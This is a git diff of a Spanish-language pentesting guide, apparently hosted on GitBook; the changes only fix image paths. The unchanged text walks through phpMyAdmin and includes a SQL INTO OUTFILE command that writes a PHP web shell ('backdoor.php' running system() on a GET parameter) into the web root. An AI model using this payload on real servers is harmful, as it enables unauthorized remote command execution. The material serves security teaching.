@@ -171,19 +171,19 @@ Una vez dentro haremos lo siguiente...
 
 Le daremos al boton `New`...
 
-<figure><img src="../.gitbook/assets/1 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/1 (1).png" alt=""><figcaption></figcaption></figure>
 
 Despues ponemos cualquier nombre en la casilla `Database Name` y seleccionamos la primera opcion de la derecha llamada `collation`...
 
-<figure><img src="../.gitbook/assets/2 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/2 (1).png" alt=""><figcaption></figcaption></figure>
 
 Le daremos a `Create` una vez hecho eso, nos iremos a nuestra base de datos creada...
 
-<figure><img src="../.gitbook/assets/3 (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/3 (1).png" alt=""><figcaption></figcaption></figure>
 
 Y le damos a la opcion llamada `SQL`...
 
-<figure><img src="../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/4.png" alt=""><figcaption></figcaption></figure>
 
 Dentro metemos el siguiente comando...
 
@@ -191,11 +191,11 @@ Dentro metemos el siguiente comando...
 SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php"
 ```
 
-<figure><img src="../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/5.png" alt=""><figcaption></figcaption></figure>
 
 Y le damos a la opcion de `Go`...
 
-<figure><img src="../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/6.png" alt=""><figcaption></figcaption></figure>
 
 Ahora si nos vamos a la `URL` donde le hemos dicho que lo cree...
 
